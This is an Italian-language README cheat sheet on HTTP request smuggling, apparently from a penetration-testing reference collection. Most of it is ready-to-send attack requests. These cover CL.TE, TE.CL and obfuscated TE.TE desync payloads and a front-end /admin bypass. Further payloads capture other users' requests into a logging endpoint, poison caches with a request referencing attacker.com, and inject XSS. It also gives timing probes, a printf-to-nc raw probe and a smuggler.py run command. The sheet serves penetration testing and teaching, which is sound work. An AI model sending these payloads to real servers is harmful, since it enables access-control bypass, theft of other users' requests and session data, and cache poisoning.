# 📦 Scheda di riferimento sull’HTTP request smuggling

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

> **Nota sui messaggi originali:** le lunghezze, le dimensioni dei chunk e le righe vuote sono conservate come nell’originale; i frammenti sono illustrativi e non tutti costituiscono richieste complete con framing coerente. Markdown non rappresenta necessariamente i byte CRLF trasmessi. Le righe che iniziano con `#` spiegano gli esempi e non sono header da inviare. Un timeout o una risposta 404, da soli, non dimostrano una desincronizzazione. Secondo [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html), la gestione dei messaggi con entrambe le intestazioni è soggetta a regole precise; i risultati dipendono dalla coppia di server e dalla configurazione.

---

## 🎯 Che cos’è il request smuggling

L’**HTTP request smuggling** sfrutta le differenze con cui il front-end (proxy) e i server back-end interpretano le richieste HTTP, permettendo di inserire richieste aggiuntive.

### Impatto
- 🔴 **Aggiramento dei controlli di sicurezza** - Aggiramento di WAF/ACL
- 🔴 **Avvelenamento della cache web** - Inserimento di risposte malevole nella cache
- 🔴 **Furto di credenziali** - Acquisizione delle richieste di altri utenti
- 🔴 **XSS** - XSS riflesso tramite una richiesta inserita di nascosto

---

## 🔍 Come funziona

### Header coinvolti
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Tipi di vulnerabilità
| Tipo | Il front-end usa | Il back-end usa |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Entrambi offuscati | Un header ignorato |

---

## 💉 Payload di attacco

### CL.TE (Content-Length → Transfer-Encoding)

**Il front-end usa Content-Length, il back-end usa Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Sfruttamento:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Il front-end usa Transfer-Encoding, il back-end usa Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (Transfer-Encoding offuscato)

```http
# Offusca l’header TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Esempi di sfruttamento

### Aggiramento della sicurezza del front-end
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Acquisizione delle richieste di altri utenti
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*La richiesta dell’utente successivo viene accodata a `data=`*

### Avvelenamento della cache tramite smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS tramite smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Individuazione

### Individuazione basata sui tempi
```http
# Test CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Se il back-end usa TE, attende il chunk "0"
# Timeout = possibile vulnerabilità
```

### Risposta differenziale
```http
# Invia una richiesta nascosta che provoca una risposta 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Se la risposta successiva è 404 = vulnerabile
```

---

## 🛠️ Strumenti

### Estensione di Burp Suite
```
1. Installa l’estensione "HTTP Request Smuggler"
2. Clic destro sulla richiesta → Extensions → Launch Smuggle Probe
3. Esamina i risultati per individuare vulnerabilità di smuggling
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Verifica manuale con curl
```bash
# Nota: curl normalizza gli header; potrebbe servire TCP grezzo
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Riferimento rapido

### Checklist di individuazione
```markdown
- [ ] Verifica la presenza di proxy o bilanciatori di carico (più server)
- [ ] Verifica i tempi per CL.TE
- [ ] Verifica i tempi per TE.CL
- [ ] Prova l’offuscamento dell’header TE
- [ ] Verifica tramite risposte differenziali
```

### Indicatori comuni
```
- Bilanciatori di carico (AWS ALB, HAProxy)
- Proxy inversi (nginx, Apache)
- CDN (Cloudflare, Akamai)
- Conversione da HTTP/2 a HTTP/1.1
```

---

## ⚠️ Note importanti

```
1. I test possono interferire con gli altri utenti
2. Usa ambienti di test isolati quando possibile
3. Aggiungi identificativi univoci per riconoscere le tue richieste
4. Segnala responsabilmente il problema con una PoC
```

---

## 📚 Risorse

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Smuggler Tool](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Inserisci richieste tramite smuggling!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
